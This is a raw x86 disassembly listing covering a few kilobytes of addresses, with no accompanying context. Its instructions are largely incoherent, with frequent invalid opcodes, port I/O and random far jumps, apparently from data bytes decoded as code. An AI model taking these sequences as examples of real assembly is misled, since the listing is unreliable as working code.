  41832e:	je     0x41836e
  418330:	and    al,0xdc
  418332:	mov    dl,0x30
  418334:	pop    edi
  418335:	outs   dx,DWORD PTR ds:[esi]
  418336:	xor    eax,0xa7dbc7a4
  41833b:	sbb    BYTE PTR [eax],ah
  41833d:	inc    eax
  41833e:	xor    eax,0xdd54216c
  418343:	in     al,dx
  418344:	loope  0x418334
  418346:	or     bl,BYTE PTR [ecx-0x3950dafa]
  41834c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41834d:	das    
  41834e:	sub    BYTE PTR [edi-0x119107a5],cl
  418354:	mov    al,0x8f
  418356:	mov    ebp,0x848ee7bf
  41835b:	jle    0x4182f7
  41835d:	outs   dx,DWORD PTR ds:[esi]
  41835e:	(bad)  
  41835f:	sbb    ah,BYTE PTR [esi]
  418361:	or     BYTE PTR [ebx+eiz*8],0xf0
  418365:	jg     0x418342
  418367:	into   
  418368:	out    0xd5,al
  41836a:	das    
  41836b:	jg     0x418394
  41836d:	and    esp,DWORD PTR [ecx+0x3b]
  418370:	inc    eax
  418371:	xlat   BYTE PTR ds:[ebx]
  418372:	add    eax,0x18e652b6
  418377:	xor    BYTE PTR [esi-0x38],dh
  41837a:	popf   
  41837b:	in     eax,0xcc
  41837d:	fs stc 
  41837f:	iret   
  418380:	jecxz  0x4183bf
  418382:	scas   al,BYTE PTR es:[edi]
  418383:	(bad)  
  418384:	ret    0xf58c
  418387:	retf   0xd105
  41838a:	in     al,0x17
  41838c:	test   DWORD PTR [edx+0x3a3152],eax
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	mov    esi,0xc2fcdab6
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR ds:0x8d000001,al
  41840d:	or     BYTE PTR [ecx-0x7796f93c],ah
  418413:	loope  0x418462
  418415:	xchg   ebx,eax
  418416:	mov    edx,0x6785de44
  41841b:	call   0xcc749ed1
  418420:	cmp    edx,ecx
  418422:	sbb    DWORD PTR [ebx+ebx*8-0x4f],0x50ca0f36
  41842a:	daa    
  41842b:	xor    eax,0x644d0421
  418430:	jmp    0x418440
  418432:	stos   BYTE PTR es:[edi],al
  418433:	lods   al,BYTE PTR ds:[esi]
  418434:	and    dh,0x90
  418437:	in     eax,dx
  418438:	stc    
  418439:	mov    ah,0x3a
  41843b:	test   BYTE PTR [esi-0x46],cl
  41843e:	jbe    0x4183fd
  418440:	mov    ch,0x14
  418442:	stc    
  418443:	push   eax
  418444:	lds    eax,FWORD PTR [esi]
  418446:	cld    
  418447:	popa   
  418448:	or     eax,0xb0b850e4
  41844d:	mov    al,BYTE PTR [ecx+0x25]
  418450:	ja     0x41840e
  418452:	adc    al,0xae
  418454:	daa    
  418455:	out    0x68,eax
  418457:	mov    al,BYTE PTR [ebp-0x5421aef4]
  41845d:	cdq    
  41845e:	in     eax,0xe4
  418460:	push   0xfffffffb
  418462:	fucomip st,st(3)
  418464:	push   esp
  418465:	cmp    eax,0x89cdbb86
  41846a:	pop    edi
  41846b:	pop    edx
  41846c:	sahf   
  41846d:	mov    edx,0xfbcb3e4b
  418472:	rol    DWORD PTR [edx+0x56bacf74],0x6b
  418479:	sahf   
  41847a:	pop    es
  41847b:	ss dec ecx
  41847d:	mov    bl,0xfe
  41847f:	push   cs
  418480:	jmp    0x9662:0x542c8723
  418487:	or     DWORD PTR [eax-0x4f],0x45f3d9bc
  41848e:	mov    ah,0x9a
  418490:	sbb    esp,DWORD PTR [esi+0x707006e]
  418496:	sbb    BYTE PTR [edi+0x5c],ah
  418499:	fcmovbe st,st(1)
  41849b:	and    eax,0x2f484623
  4184a0:	sub    cl,dh
  4184a2:	icebp  
  4184a3:	shl    bh,cl
  4184a5:	sbb    ecx,ebx
  4184a7:	push   ds
  4184a8:	mov    ebp,0x2179febc
  4184ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184ae:	xchg   esp,eax
  4184af:	add    al,0x86
  4184b1:	(bad)  
  4184b2:	rcr    esi,cl
  4184b4:	aam    0xc7
  4184b6:	mov    ah,0x4f
  4184b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b9:	scas   al,BYTE PTR es:[edi]
  4184ba:	add    eax,0xbd8de026
  4184bf:	pop    ds
  4184c0:	pop    edi
  4184c1:	std    
  4184c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c3:	push   eax
  4184c4:	bound  ebp,QWORD PTR [esi]
  4184c6:	out    dx,eax
  4184c7:	and    DWORD PTR [edi+0x6f],eax
  4184ca:	jb     0x418509
  4184cc:	in     al,dx
  4184cd:	fisttp WORD PTR [edi+edi*2-0x6df5486d]
  4184d4:	add    eax,0x6724f945
  4184d9:	add    eax,0x7db7c5b7
  4184de:	adc    BYTE PTR [ebx+0x19],al
  4184e1:	fst    DWORD PTR [eax-0x47f0d510]
  4184e7:	out    dx,al
  4184e8:	pop    ecx
  4184e9:	sbb    esp,ecx
  4184eb:	rol    BYTE PTR [edx*1-0x50ab77e],cl
  4184f2:	pusha  
  4184f3:	push   eax
  4184f4:	stos   BYTE PTR es:[edi],al
  4184f5:	(bad)  
  4184f6:	push   edi
  4184f7:	(bad)  
  4184f8:	popf   
  4184f9:	push   0x6e58d766
  4184fe:	push   ss
  4184ff:	or     al,0x54
  418501:	and    al,0x91
  418503:	sub    cl,BYTE PTR [edi+0x4072df28]
  418509:	imul   DWORD PTR [edx-0x79b64c7e]
  41850f:	pop    esi
  418510:	mov    dl,0x0
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	retf   
  418581:	lds    edi,FWORD PTR [esi]
  418583:	hlt    
  418584:	mov    DWORD PTR [ecx],0x1050001
  41858a:	add    BYTE PTR [eax],al
  41858c:	cwde   
  41858d:	dec    eax
  41858e:	das    
  41858f:	or     DWORD PTR [ecx],ecx
  418591:	fidivr DWORD PTR [esi]
  418593:	xchg   edx,eax
  418594:	gs sub ah,cl
  418597:	inc    ebp
  418598:	clts   
  41859a:	jno    0x4185ce
  41859c:	xchg   ecx,eax
  41859d:	(bad)  
  41859e:	je     0x418532
  4185a0:	jb     0x418578
  4185a2:	test   al,0xa0
  4185a4:	jne    0x41858e
  4185a6:	in     eax,0x95
  4185a8:	xor    BYTE PTR [edi-0x74],0x68
  4185ac:	fimul  DWORD PTR [ebx-0x7363160a]
  4185b2:	inc    edx
  4185b3:	jmp    0x418607
  4185b5:	scas   al,BYTE PTR es:[edi]
  4185b6:	sub    al,0xd2
  4185b8:	aas    
  4185b9:	int3   
  4185ba:	jg     0x4185dd
  4185bc:	lods   eax,DWORD PTR ds:[esi]
  4185bd:	data16 aaa 
  4185bf:	aam    0x81
  4185c1:	popa   
  4185c2:	add    DWORD PTR [ebx-0xe],esi
  4185c5:	adc    al,0x45
  4185c7:	dec    esi
  4185c8:	mov    ecx,0xe1eb3589
  4185cd:	cmc    
  4185ce:	ja     0x4185e5
  4185d0:	and    cl,BYTE PTR [ecx]
  4185d2:	sbb    al,0x4d
  4185d4:	sbb    cl,cl
  4185d6:	in     eax,dx
  4185d7:	or     cl,BYTE PTR [di-0x2cf7]
  4185dc:	into   
  4185dd:	push   ds
  4185de:	xchg   esi,eax
  4185df:	mov    esp,0x250d5d49
  4185e4:	nop
  4185e5:	xchg   ecx,eax
  4185e6:	lahf   
  4185e7:	(bad)  [eax+0x422bc4ea]
  4185ed:	push   ss
  4185ee:	test   eax,0xa82f7001
  4185f3:	test   DWORD PTR [ecx+0x37],ecx
  4185f6:	sbb    DWORD PTR [esi],ecx
  4185f8:	sbb    al,0x1a
  4185fa:	inc    ebx
  4185fb:	shr    BYTE PTR [ebx-0x7b],1
  4185fe:	or     eax,0xdf27c42c
  418603:	aas    
  418604:	sub    DWORD PTR es:[ebx-0x6d53002d],eax
  41860b:	les    esi,FWORD PTR [ebp+0xbda40b7]
  418611:	or     eax,0x96fffa6d
  418616:	xchg   DWORD PTR [ebx+ebx*1+0x11],ebx
  41861a:	test   eax,0xe4ed25ea
  41861f:	and    cl,BYTE PTR [edi+0x6f2b5a79]
  418625:	fsubr  st,st(7)
  418627:	call   0x40fb7426
  41862c:	call   0xe69d:0x5e5267a5
  418633:	mov    eax,0xbed63dab
  418638:	sub    al,0xe6
  41863a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41863b:	sub    bh,0x56
  41863e:	pop    edi
  41863f:	push   edx
  418640:	mov    WORD PTR [edi+eiz*4],cs
  418643:	xchg   esp,eax
  418644:	dec    ecx
  418645:	je     0x418632
  418647:	inc    edi
  418648:	sub    dl,BYTE PTR [ecx]
  41864a:	ss xchg ebp,eax
  41864c:	jge    0x418653
  41864e:	mov    DWORD PTR [edx],ecx
  418650:	shl    BYTE PTR [eax-0x63dcac9d],cl
  418656:	cmp    DWORD PTR [esi],0xffffffbb
  418659:	ds sti 
  41865b:	out    0xe6,eax
  41865d:	and    al,0x4e
  41865f:	(bad)  
  418660:	mov    esp,DWORD PTR [edx+0xeeb03bf]
  418666:	nop    DWORD PTR [edi-0x43]
  41866a:	shr    BYTE PTR ds:0xcb678c2b,1
  418670:	test   DWORD PTR [ecx-0x4a6ec201],edx
  418676:	aad    0x1c
  418678:	out    0x5f,al
  41867a:	mov    eax,0x547fb139
  41867f:	sub    eax,0x3035006e
  418684:	cmovae ebx,DWORD PTR [ecx+0x47e98da2]
  41868b:	xchg   DWORD PTR [esi],ebx
  41868d:	jge    0x418694
  41868f:	stos   BYTE PTR es:[edi],al
  418690:	adc    al,0x0
	...
  4186f2:	add    BYTE PTR [eax],al
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	popf   
  418701:	mov    al,0x21
  418704:	int3   
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0x20000001,al
  41870d:	mov    esi,0x445b4c5b
  418712:	mov    al,ds:0x76fe03a3
  418717:	shl    ecx,1
  418719:	(bad)  
  41871a:	out    dx,al
  41871b:	repz xor BYTE PTR [edx+0x4193f8f2],0xb5
  418723:	push   ds
  418724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418725:	lock or eax,0x942d96d9
  41872b:	jbe    0x41874a
  41872d:	gs mov dl,0xbe
  418730:	in     eax,dx
  418731:	inc    ebx
  418732:	jle    0x4186fe
  418734:	call   0xcf34:0xace54eac
  41873b:	adc    BYTE PTR [esi],cl
  41873d:	mov    ebx,DWORD PTR [ebx+ecx*1-0x4885841c]
  418744:	push   ecx
  418745:	xchg   edi,eax
  418746:	shl    DWORD PTR [eax-0x57f0cfb8],0xa2
  41874d:	inc    edx
  41874e:	mov    WORD PTR [edi+eax*4-0x69],?
  418752:	cmp    eax,0x31319798
  418757:	arpl   WORD PTR [ecx*8-0x73e6ffdb],di
  41875e:	xchg   ebp,eax
  41875f:	lods   al,BYTE PTR ds:[esi]
  418760:	aaa    
  418761:	retf   
  418762:	es stc 
  418764:	pop    ds
  418765:	addr16 sahf 
  418767:	mov    DWORD PTR ds:0x7bbe109,edi
  41876d:	xor    ebx,DWORD PTR ds:0xd77ddfd
  418773:	test   DWORD PTR [edx+0x542898dc],0xfd7a9751
  41877d:	sub    ch,al
  41877f:	xchg   ecx,eax
  418780:	pop    ebp
  418781:	iret   
  418782:	inc    ecx
  418783:	jno    0x4187b6
  418785:	sub    BYTE PTR [ebx-0x587d2956],cl
  41878b:	mov    WORD PTR [ebp+0x4d],ss
  41878e:	jae    0x4187b3
  418790:	and    al,0x9c
  418792:	adc    DWORD PTR [ebx+ebx*8+0xb],0xfffffff7
  418797:	test   ax,0x5096
  41879b:	out    dx,eax
  41879c:	sar    BYTE PTR [edi],1
  41879e:	dec    edx
  41879f:	test   al,0xc5
  4187a1:	sub    BYTE PTR [ecx+0x24],dh
  4187a4:	sub    DWORD PTR [ecx-0x51],esp
  4187a7:	outs   dx,DWORD PTR ds:[esi]
  4187a8:	mov    fs:0xc619ddc2,eax
  4187ae:	fadd   st,st(1)
  4187b0:	push   esi
  4187b1:	sbb    eax,0x272efc9c
  4187b6:	xor    DWORD PTR [esi+0x4d],esi
  4187b9:	fwait
  4187ba:	lds    edx,FWORD PTR [edx+0x12]
  4187bd:	cli    
  4187be:	lds    eax,FWORD PTR [ebp+eax*2+0x8]
  4187c2:	pushf  
  4187c3:	sbb    eax,0xc5a8aa9a
  4187c8:	lods   al,BYTE PTR ds:[esi]
  4187c9:	or     DWORD PTR [ebx-0x64],ebx
  4187cc:	mov    al,ds:0xf184431b
  4187d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187d2:	(bad)  
  4187d3:	dec    eax
  4187d4:	jns    0x418802
  4187d6:	jmp    0x418809
  4187d8:	lods   al,BYTE PTR ds:[esi]
  4187d9:	mov    dh,0xe6
  4187db:	mov    dl,0xc2
  4187dd:	sub    ah,BYTE PTR [esi]
  4187df:	fs pop esi
  4187e1:	jns    0x418782
  4187e3:	cmp    al,0x22
  4187e5:	test   DWORD PTR [ebp+eiz*8+0x67],esi
  4187e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ea:	ror    DWORD PTR [esi+0x72],cl
  4187ed:	pop    ebx
  4187ee:	mov    bh,0x18
  4187f0:	adc    dh,ah
  4187f2:	push   ebx
  4187f3:	jp     0x4187a8
  4187f5:	inc    esp
  4187f6:	add    dh,BYTE PTR cs:[ebp+0x7b97c4b2]
  4187fd:	jno    0x418832
  4187ff:	into   
  418800:	push   esi
  418801:	mov    bl,0x6b
  418803:	in     eax,dx
  418804:	sahf   
  418805:	cmp    BYTE PTR [ebp-0x2f],dl
  418808:	inc    esi
  418809:	dec    edx
  41880a:	mov    DWORD PTR [edi],esi
  41880c:	pop    ebp
  41880d:	mov    cl,0xa1
  41880f:	push   ebp
  418810:	add    BYTE PTR [eax],0x0
	...
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x3363c533]
  418881:	pop    ss
  418882:	mov    DWORD PTR [ecx],esp
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0xa4000001
  41888d:	scas   eax,DWORD PTR es:[edi]
  41888e:	push   gs
  418890:	aaa    
  418891:	aas    
  418892:	out    dx,eax
  418893:	mov    eax,0xe8012170
  418898:	es inc edx
  41889a:	sub    BYTE PTR [edi+0x75],ch
  41889d:	jb     0x41885f
  41889f:	cs add al,0x4f
  4188a2:	sbb    cl,cl
  4188a4:	test   DWORD PTR [esi],ebp
  4188a6:	jo     0x4188c7
  4188a8:	mov    al,0x8d
  4188aa:	xchg   dl,dl
  4188ac:	xor    eax,0xcd7a1dd9
  4188b1:	mov    DWORD PTR [ebx-0x4e],ecx
  4188b4:	dec    eax
  4188b5:	pop    eax
  4188b6:	xchg   esp,eax
  4188b7:	aaa    
  4188b8:	jecxz  0x418918
  4188ba:	mov    ds:0x472a287d,al
  4188bf:	xchg   esi,eax
  4188c0:	sti    
  4188c1:	sbb    BYTE PTR [ecx],al
  4188c3:	inc    edi
  4188c4:	jge    0x418863
  4188c6:	popa   
  4188c7:	cmp    dh,bl
  4188c9:	scas   eax,DWORD PTR es:[edi]
  4188ca:	mov    bh,0x3d
  4188cc:	cmp    cl,BYTE PTR [ebx-0x19]
  4188cf:	popa   
  4188d0:	xchg   ecx,eax
  4188d1:	lods   al,BYTE PTR ds:[esi]
  4188d2:	xchg   edi,eax
  4188d3:	adc    dh,BYTE PTR [edx+ebx*2-0x3d37c377]
  4188da:	fsubr  DWORD PTR [esp+esi*2]
  4188dd:	adc    edx,0xee8c99f3
  4188e3:	lds    edx,FWORD PTR [ebx+eiz*2]
  4188e6:	mov    dh,0x2f
  4188e8:	fmul   QWORD PTR [ebx+eax*8-0x62e68e3e]
  4188ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f0:	jl     0x418936
  4188f2:	xor    ch,bl
  4188f4:	shl    al,cl
  4188f6:	sbb    esp,DWORD PTR [ebx+eiz*8]
  4188f9:	sub    DWORD PTR [esi],edx
  4188fb:	xor    DWORD PTR [eax+0x7c],ebx
  4188fe:	adc    ebp,ecx
  418900:	(bad)  
  418901:	lds    edi,FWORD PTR [ebp-0xd]
  418904:	mov    eax,ebx
  418906:	cmp    edi,DWORD PTR [ebx-0x55fe2ebe]
  41890c:	mov    esi,ecx
  41890e:	mov    ds:0xb616c5d0,al
  418913:	jne    0x418965
  418915:	pop    ebp
  418916:	stos   DWORD PTR es:[edi],eax
  418917:	jbe    0x41895d
  418919:	adc    al,0x56
  41891b:	inc    eax
  41891c:	mov    esi,0xe40a71c9
  418921:	push   edx
  418922:	in     eax,dx
  418923:	sahf   
  418924:	push   0x1e44045c
  418929:	jb     0x4188da
  41892b:	push   ebx
  41892c:	or     eax,0xa136a6ab
  418931:	pusha  
  418932:	cdq    
  418933:	push   es
  418934:	iret   
  418935:	ret    
  418936:	dec    ecx
  418937:	xchg   ebp,eax
  418938:	fsub   DWORD PTR [ebp-0x47d5bd4f]
  41893e:	and    al,bl
  418940:	xchg   esp,eax
  418941:	and    DWORD PTR [edx],edi
  418943:	mov    ah,0xb9
  418945:	inc    esi
  418946:	jecxz  0x418946
  418948:	in     eax,dx
  418949:	lods   eax,DWORD PTR ds:[esi]
  41894a:	mov    ch,0xa3
  41894c:	jb     0x418913
  41894e:	and    eax,0xeae72e48
  418953:	stos   DWORD PTR es:[edi],eax
  418954:	or     DWORD PTR [ebx+eax*2+0xbff526d],eax
  41895b:	call   0x984a12b6
  418960:	jmp    FWORD PTR [esi-0x7a81e74b]
  418966:	jecxz  0x4189d5
  418968:	xchg   ebp,eax
  418969:	adc    eax,DWORD PTR [eax-0x3d]
  41896c:	test   DWORD PTR [ecx-0x23],0x9ef4c320
  418973:	ja     0x4188fa
  418975:	outs   dx,DWORD PTR ds:[esi]
  418976:	inc    ebp
  418977:	retf   
  418978:	lods   al,BYTE PTR ds:[esi]
  418979:	add    al,0x72
  41897b:	xchg   ecx,eax
  41897c:	sub    BYTE PTR [ebx-0x1b],al
  41897f:	fisttp WORD PTR [eax+0x68]
  418982:	pop    ebp
  418983:	fsub   QWORD PTR [esi-0x16]
  418986:	popf   
  418987:	cmp    ebx,ecx
  418989:	mov    ds:0x708558c5,al
  41898e:	pusha  
  41898f:	out    dx,al
  418990:	lods   al,BYTE PTR ds:[esi]
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x37c2d169
  418a03:	rcl    esi,0x4
  418a06:	add    DWORD PTR [eax],eax
  418a08:	add    eax,0x76000001
  418a0d:	dec    edi
  418a0e:	shl    DWORD PTR [ecx+0x66d3c110],0xb7
  418a15:	inc    ecx
  418a16:	cmp    ch,BYTE PTR ss:[ebx-0x67]
  418a1a:	aaa    
  418a1b:	mov    bh,ah
  418a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a1e:	repz cmp DWORD PTR ds:0xa59350b5,edi
  418a25:	sar    esi,cl
  418a27:	or     DWORD PTR [ecx-0x765b7ac8],edi
  418a2d:	mov    esi,0xd2d29030
  418a32:	or     BYTE PTR [eax],ah
  418a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a35:	fcom   DWORD PTR [ecx]
  418a37:	push   0xffffffdd
  418a39:	push   cs
  418a3a:	mov    al,0x89
  418a3c:	adc    DWORD PTR [ebp-0x4adcdb83],ebp
  418a42:	push   ecx
  418a43:	test   ch,ch
  418a45:	or     BYTE PTR [edx],al
  418a47:	cmp    al,0x68
  418a49:	lea    ecx,[edi+0x60f0b784]
  418a4f:	aad    0xe1
  418a51:	inc    ebp
  418a52:	outs   dx,BYTE PTR ds:[esi]
  418a53:	sub    esi,ebx
  418a55:	jle    0x418a91
  418a57:	pop    ss
  418a58:	out    0xbb,al
  418a5a:	mov    ebx,DWORD PTR [edx+0x7]
  418a5d:	inc    eax
  418a5e:	xchg   edx,eax
  418a5f:	xchg   edx,eax
  418a60:	(bad)  
  418a61:	lods   eax,DWORD PTR ds:[esi]
  418a62:	dec    ebx
  418a63:	dec    BYTE PTR [edi-0x20]
  418a66:	mov    dl,0x5e
  418a68:	xor    eax,0x55930cc1
  418a6d:	add    eax,DWORD PTR [ecx]
  418a6f:	and    bl,ch
  418a71:	hlt    
  418a72:	dec    ebx
  418a73:	inc    esp
  418a74:	pop    ds
  418a75:	and    DWORD PTR [ecx],eax
  418a77:	mov    esi,0x64adad3b
  418a7c:	xchg   cl,ah
  418a7e:	retf   
  418a7f:	push   ebp
  418a80:	fidivr DWORD PTR [esi]
  418a82:	jno    0x418a7b
  418a84:	retf   
  418a85:	jno    0x418ab1
  418a87:	cmp    al,0x33
  418a89:	inc    eax
  418a8a:	gs xor eax,0x1effd4d2
  418a90:	adc    al,0x62
  418a92:	cli    
  418a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a94:	and    edx,edx
  418a96:	dec    ebp
  418a97:	pop    edi
  418a98:	sbb    BYTE PTR ds:0xc6439540,0xfa
  418a9f:	(bad)  
  418aa0:	mov    dh,0x59
  418aa2:	add    al,0x37
  418aa4:	je     0x418a7c
  418aa6:	mov    bl,0x55
  418aa8:	or     eax,0x8d8b3080
  418aad:	in     al,dx
  418aae:	pop    eax
  418aaf:	pop    ebp
  418ab0:	mov    edi,0x2e16ddbb
  418ab5:	inc    eax
  418ab6:	dec    esi
  418ab7:	sbb    eax,DWORD PTR [ecx]
  418ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aba:	shl    DWORD PTR [ebx-0x3],0xe4
  418abe:	ret    
  418abf:	popf   
  418ac0:	mov    esi,0xcf7ac95f
  418ac5:	jne    0x418adc
  418ac7:	add    BYTE PTR [ebp+0x1],bh
  418aca:	lods   eax,DWORD PTR ds:[esi]
  418acb:	inc    eax
  418acc:	fiadd  WORD PTR [ebp+0x4a88f9d5]
  418ad2:	push   ds
  418ad3:	xor    eax,0xec7af1d8
  418ad8:	in     eax,0xb9
  418ada:	inc    edi
  418adb:	sub    cl,BYTE PTR [eax-0x17]
  418ade:	add    bl,dh
  418ae0:	mov    DWORD PTR ds:0xe2e408cd,ebx
  418ae6:	popf   
  418ae7:	lds    ecx,FWORD PTR ds:0xf0d61f3c
  418aed:	mov    dl,0x49
  418aef:	adc    esp,esi
  418af1:	inc    ecx
  418af2:	scas   al,BYTE PTR es:[edi]
  418af3:	mov    ecx,0x106cb254
  418af8:	pop    eax
  418af9:	js     0x418ac9
  418afb:	jne    0x418b4d
  418afd:	cld    
  418afe:	mov    ds:0xcc210082,al
  418b03:	cli    
  418b04:	dec    edx
  418b05:	jle    0x418b5e
  418b07:	fbstp  TBYTE PTR [edi+0x9]
  418b0a:	clc    
  418b0b:	xchg   edi,eax
  418b0c:	dec    eax
  418b0d:	mov    edx,eax
  418b0f:	rcl    al,cl
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x4d
  418b81:	idiv   BYTE PTR [ecx]
  418b83:	(bad)  
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	inc    ecx
  418b8d:	cmp    ecx,esi
  418b8f:	xchg   ebp,eax
  418b90:	cld    
  418b91:	test   BYTE PTR [ebx-0x8e26152],0x9f
  418b98:	or     al,0xc8
  418b9a:	fimul  DWORD PTR [esi-0xac70e5b]
  418ba0:	ins    BYTE PTR es:[edi],dx
  418ba1:	aas    
  418ba2:	push   ecx
  418ba3:	mov    ch,0x96
  418ba5:	ja     0x418b2b
  418ba7:	int3   
  418ba8:	push   0x56afbd75
  418bad:	cmp    ch,al
  418baf:	mov    ah,0x77
  418bb1:	sbb    al,0x27
  418bb3:	jge    0x418b7a
  418bb5:	fcmovu st,st(4)
  418bb7:	pusha  
  418bb8:	or     DWORD PTR [ecx-0x7caeb375],0xfb1c828f
  418bc2:	mov    ecx,0x59fca054
  418bc7:	mov    edi,0x41943213
  418bcc:	stos   DWORD PTR es:[edi],eax
  418bcd:	fldlg2 
  418bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd0:	or     BYTE PTR [eax+0x4ce7b86c],al
  418bd6:	test   BYTE PTR [edx+0x15d063a1],bh
  418bdc:	and    BYTE PTR ds:0x33bb8c47,ah
  418be2:	pop    ss
  418be3:	gs push cs
  418be5:	mov    DWORD PTR [eax+0x1d07691f],esp
  418beb:	ins    BYTE PTR es:[edi],dx
  418bec:	in     eax,dx
  418bed:	inc    esp
  418bee:	setp   BYTE PTR [ecx+eax*1-0x15b38989]
  418bf6:	jne    0x418ba5
  418bf8:	sbb    al,dl
  418bfa:	ja     0x418c0a
  418bfc:	es sti 
  418bfe:	ficomp WORD PTR [eax+0x15]
  418c01:	xchg   ebp,eax
  418c02:	aad    0xbb
  418c04:	in     al,dx
  418c05:	xchg   ebx,eax
  418c06:	sbb    esp,DWORD PTR [esi+edi*2]
  418c09:	inc    esp
  418c0a:	pop    ecx
  418c0b:	imul   ch
  418c0d:	xor    dl,BYTE PTR [esi-0x3a43f9f9]
  418c13:	inc    ebp
  418c14:	fist   DWORD PTR [edx+0x30dc2076]
  418c1a:	in     al,dx
  418c1b:	test   eax,0x75e7edcf
  418c20:	lahf   
  418c21:	lea    ebp,[edx-0x20]
  418c24:	cld    
  418c25:	ins    DWORD PTR es:[edi],dx
  418c26:	stc    
  418c27:	fs ins DWORD PTR es:[edi],dx
  418c29:	popa   
  418c2a:	adc    esi,DWORD PTR [edi*1+0x76e9f895]
  418c31:	popa   
  418c32:	jmp    FWORD PTR [edi-0x59f88cc6]
  418c38:	retf   0x9ef
  418c3b:	or     DWORD PTR [eax],eax
  418c3d:	cmp    bh,dl
  418c3f:	popa   
  418c40:	fsubr  DWORD PTR [edi]
  418c42:	mov    db5,edx
  418c45:	repnz push es
  418c47:	sub    ah,BYTE PTR fs:[eax+0x22]
  418c4b:	or     edi,DWORD PTR [ecx+0x674aac59]
  418c51:	push   ds
  418c52:	inc    ebp
  418c53:	mov    BYTE PTR [ecx],ch
  418c55:	test   DWORD PTR [ebx+0x4690ea74],esi
  418c5b:	adc    al,0x5a
  418c5d:	pop    ecx
  418c5e:	xlat   BYTE PTR ds:[ebx]
  418c5f:	jne    0x418ce0
  418c61:	cmp    edi,DWORD PTR [eax]
  418c63:	loopne 0x418c47
  418c65:	ret    
  418c66:	sub    ah,BYTE PTR ds:0x21189afb
  418c6c:	jg     0x418c77
  418c6e:	loope  0x418c94
  418c70:	lods   eax,DWORD PTR ds:[esi]
  418c71:	arpl   WORD PTR [ebp+0x2c],di
  418c74:	jl     0x418cee
  418c76:	js     0x418c78
  418c78:	jo     0x418c6c
  418c7a:	inc    esp
  418c7b:	mov    eax,DWORD PTR [edx-0x651a7563]
  418c81:	(bad)  
  418c82:	adc    BYTE PTR [eax-0x6f],bl
  418c85:	es call 0x836d:0xab5e7020
  418c8d:	in     al,0x4a
  418c8f:	push   cs
  418c90:	stos   BYTE PTR es:[edi],al
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rol    bh,cl
  418d01:	ja     0x418cfe
  418d03:	mov    al,0xe0
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x39000001
  418d0d:	push   ebp
  418d0e:	mov    bh,0x37
  418d10:	xchg   ebp,eax
  418d11:	mov    bh,0x61
  418d13:	arpl   WORD PTR [edx+eax*2],bp
  418d16:	inc    esp
  418d17:	fimul  DWORD PTR [esi+0x74]
  418d1b:	aad    0x55
  418d1d:	cmp    eax,DWORD PTR [eax+0x5991e286]
  418d23:	mov    BYTE PTR [di],ah
  418d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d27:	push   cs
  418d28:	add    edi,edx
  418d2a:	stos   DWORD PTR es:[edi],eax
  418d2b:	ficom  DWORD PTR [esi+edi*1]
  418d2e:	adc    eax,0xde50fee1
  418d33:	dec    ecx
  418d34:	lods   eax,DWORD PTR ds:[esi]
  418d35:	test   DWORD PTR [edx+ecx*2+0x4adc8af2],edi
  418d3c:	xor    esp,ebp
  418d3e:	jne    0x418d72
  418d40:	xchg   BYTE PTR [ecx+0x5c1bd805],dh
  418d46:	xchg   esp,eax
  418d47:	mov    edi,0xa2858bca
  418d4c:	popa   
  418d4d:	mov    ecx,esp
  418d4f:	jle    0x418d0c
  418d51:	icebp  
  418d52:	fdivrp st(3),st
  418d54:	inc    esi
  418d55:	icebp  
  418d56:	scas   eax,DWORD PTR es:[edi]
  418d57:	inc    eax
  418d58:	mov    al,0xf2
  418d5a:	sbb    eax,0xfe269117
  418d5f:	pop    esi
  418d60:	leave  
  418d61:	jg     0x418d6e
